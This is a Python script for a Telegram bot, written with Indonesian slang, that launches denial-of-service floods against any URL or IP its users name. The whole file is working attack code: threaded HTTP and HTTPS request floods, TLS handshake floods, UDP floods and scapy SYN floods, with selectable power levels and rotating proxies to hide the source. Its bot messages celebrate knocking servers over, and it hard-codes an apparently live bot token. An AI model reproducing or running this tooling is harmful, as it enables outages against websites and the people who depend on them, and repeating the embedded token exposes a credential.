import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import threading
import time
import socket
import ssl
import random
import scapy.all as scapy  # Buat SYN flood

bot = telebot.TeleBot("8309103033:AAGe8aSeQwsDjECSBp6mlWec6CnQY3DjiR8")  # Ganti token lo

@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("DDoS Menu", callback_data="ddos_menu"))
    markup.add(InlineKeyboardButton("Attack Levels", callback_data="levels"))
    markup.add(InlineKeyboardButton("Methods: TLS, HTTPS, UDP, SYN, HTTP", callback_data="methods"))
    markup.add(InlineKeyboardButton("Add Proxy", callback_data="proxy"))
    markup.add(InlineKeyboardButton("Info & Status", callback_data="info"))
    markup.add(InlineKeyboardButton("Stop Attack", callback_data="stop"))
    bot.send_message(message.chat.id, "WSP bro? Omega DDoS Bot upgraded! Pilih menu buat ngebantai server:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data == "ddos_menu":
        bot.send_message(call.message.chat.id, "Masukkan /ddos <url> buat basic HTTP flood!")
    elif call.data == "levels":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Low (10 threads)", callback_data="low"))
        markup.add(InlineKeyboardButton("Medium (50 threads)", callback_data="med"))
        markup.add(InlineKeyboardButton("Full Power (200 threads)", callback_data="full"))
        bot.send_message(call.message.chat.id, "Pilih level:", reply_markup=markup)
    elif call.data == "methods":
        bot.send_message(call.message.chat.id, "Methods available: tls, https, udp, syn, http. Gunain /attack <method> <url> <threads>")
    elif call.data == "proxy":
        bot.send_message(call.message.chat.id, "Kirim /proxy <ip:port,ip:port>")
    elif call.data == "info":
        bot.send_message(call.message.chat.id, "Bot DDoS ultimate V2, bro! TLS flood, HTTPS storm, UDP, SYN, HTTP—all in one. Status: Locked and loaded! 🔥")
    elif call.data == "stop":
        bot.send_message(call.message.chat.id, "Attack stopped. Chill.")
    elif call.data in ["low", "med", "full"]:
        bot.send_message(call.message.chat.id, f"Level {call.data} dipilih, gunain /attack <method> <url> <level>")

proxies = []

def http_flood(url, num_threads):
    def attack():
        while True:
            try:
                if proxies:
                    proxy = random.choice(proxies)
                    requests.get(url, proxies={"http": proxy, "https": proxy})
                else:
                    requests.get(url)
                time.sleep(0.01)
            except:
                pass
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()

def https_storm(url, num_threads):
    def attack():
        while True:
            try:
                if proxies:
                    proxy = random.choice(proxies)
                    requests.get(url, proxies={"http": proxy, "https": proxy}, verify=False)
                else:
                    requests.get(url, verify=False)
                time.sleep(0.01)
            except:
                pass
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()

def tls_flood(host, port=443, num_threads=200):
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ssl_sock = ssl.wrap_socket(s)
                ssl_sock.connect((host, port))
                ssl_sock.close()  # Handshake gantung
            except:
                pass
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()

def udp_flood(target_ip, target_port, num_threads):
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock.sendto(random._urandom(1024), (target_ip, target_port))
            except:
                pass
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()

def syn_flood(target_ip, target_port, num_threads):
    def attack():
        while True:
            try:
                ip = scapy.IP(dst=target_ip)
                tcp = scapy.TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
                scapy.send(ip / tcp, verbose=0)
            except:
                pass
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.start()

@bot.message_handler(commands=['attack'])
def attack_command(message):
    try:
        method = message.text.split()[1]
        url_or_ip = message.text.split()[2]
        threads = int(message.text.split()[3])
        if method == "http":
            bot.send_message(message.chat.id, f"HTTP flood on {url_or_ip} with {threads} threads! 😈")
            http_flood(url_or_ip, threads)
        elif method == "https":
            bot.send_message(message.chat.id, f"HTTPS storm on {url_or_ip} with {threads} threads! 🔥")
            https_storm(url_or_ip, threads)
        elif method == "tls":
            host = url_or_ip.replace("https://", "").split("/")[0]
            bot.send_message(message.chat.id, f"TLS flood on {host} with {threads} threads! 💥")
            tls_flood(host, 443, threads)
        elif method == "udp":
            ip_port = url_or_ip.split(":")
            bot.send_message(message.chat.id, f"UDP flood on {ip_port[0]}:{ip_port[1]} with {threads} threads! 🌪️")
            udp_flood(ip_port[0], int(ip_port[1]), threads)
        elif method == "syn":
            ip_port = url_or_ip.split(":")
            bot.send_message(message.chat.id, f"SYN flood on {ip_port[0]}:{ip_port[1]} with {threads} threads! ⚡")
            syn_flood(ip_port[0], int(ip_port[1]), threads)
    except:
        bot.send_message(message.chat.id, "Format: /attack <method> <url/ip:port> <threads>")

@bot.message_handler(commands=['proxy'])
def add_proxy(message):
    try:
        proxy_list = message.text.split()[1].split(',')
        proxies.extend(proxy_list)
        bot.send_message(message.chat.id, f"Added {len(proxy_list)} proxies! More power! 😎")
    except:
        bot.send_message(message.chat.id, "Format: /proxy <ip:port,ip:port>")

bot.polling()
